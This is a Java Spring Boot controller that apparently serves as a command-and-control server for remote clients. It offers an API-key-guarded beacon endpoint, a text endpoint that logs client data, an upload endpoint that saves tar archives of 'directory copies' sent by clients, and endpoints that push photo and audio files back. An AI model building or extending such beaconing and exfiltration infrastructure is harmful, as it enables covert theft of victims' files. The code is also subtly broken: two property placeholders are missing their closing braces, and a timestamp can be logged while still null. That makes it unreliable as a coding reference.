package com.example.demo;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import jakarta.servlet.http.HttpServletRequest;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestHeader;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.LocalDateTime;
import java.util.HashMap;
import java.util.Map;

/*
    Main Rest Controller for server endpoints
    This holds the beacon endpoint and basic functions
*/

@RestController
@RequestMapping("/api")
public class MainController {
    private LocalDateTime time;
    private BeaconService beaconService;
    private UploadService uploadService;
    private LoggerService loggerService;

    // Inject services
    public MainController(BeaconService beaconService, UploadService uploadService, LoggerService loggerService){
        this.beaconService = beaconService;
        this.uploadService = uploadService;
        this.loggerService = loggerService;
    }

    // Initialize values from properties
    @Value("${api.key}")
    String API_KEY;

    @Value("${app.photo.dir")
    String photoDir;

    @Value("${app.audio.dir")
    String audioDir;

    @GetMapping("/status")
    public ResponseEntity<Map<String, Object>> getStatus(@RequestHeader ("x-api-key") String token) {
        if(!token.equals(API_KEY)){
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }
        
        // Return that the server is up and timestamp
        time = LocalDateTime.now();
        Map<String, Object> statusMap = new HashMap<>();
        statusMap.put("status", "up");
        statusMap.put("time", time);

        return ResponseEntity.ok(statusMap);
    }
    
    // Beacon endpoint so the client can ping back
    @GetMapping("/beacon")
    public ResponseEntity<Map<String, Object>> sendBeaconData(@RequestHeader ("x-api-key") String token) {
        if(!token.equals(API_KEY)){
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }

        return ResponseEntity.ok(beaconService.sendResponse());
    }

    @PostMapping("/txtresponse")
    public ResponseEntity<String> getResponse(@RequestHeader ("x-api-key") String token, @RequestBody RequestDTO request){
        if(!token.equals(API_KEY)){
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }

        System.out.println(time + "[ALERT]" + " Incoming from client...");
        System.out.println(request.getData());

        // Log the incoming data
        String data = time + " " + request.getData();
        loggerService.logData(data);
        
        return ResponseEntity.ok("success");
    }

    // Recieves uploaded dir from client
    @PostMapping(path = "/upload", consumes = "application/x-tar")
    public ResponseEntity<String> uploadFolder(HttpServletRequest request, @RequestHeader ("x-api-key") String token){
        if(!token.equals(API_KEY)){
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }

        System.out.println(time + "[ALERT] Client is sending directory copies!");
        try {
            uploadService.saveFolder(request.getInputStream());
        } catch (IOException e) {
            e.printStackTrace();
        }

        System.out.println("Client dir has been saved.");

        return ResponseEntity.ok("Saved archive!");
    }

    @GetMapping("/photo")
    public ResponseEntity<byte[]> sendPng(@RequestHeader ("x-api-key") String token) throws IOException{
        if(!token.equals(API_KEY)){
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }

        Path photoPath = Path.of(photoDir).toAbsolutePath().normalize();
        // Sends photo as bytes to client
        byte[] imageBytes = Files.readAllBytes(photoPath);

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.IMAGE_PNG);
        headers.setContentLength(imageBytes.length);

        return new ResponseEntity<>(imageBytes, headers, HttpStatus.OK);
        
    }

    @GetMapping("/audio")
    public ResponseEntity<byte[]> sendAudio(@RequestHeader ("x-api-key") String token) throws IOException{
        if(!token.equals(API_KEY)){
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
        }

        Path audioPath = Path.of(audioDir).toAbsolutePath().normalize();
        // Sends audio as bytes to client
        byte[] audioBytes = Files.readAllBytes(audioPath);

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.parseMediaType("audio/mpeg"));
        headers.setContentLength(audioBytes.length);

        return new ResponseEntity<>(audioBytes, headers, HttpStatus.OK);
        
    }
}
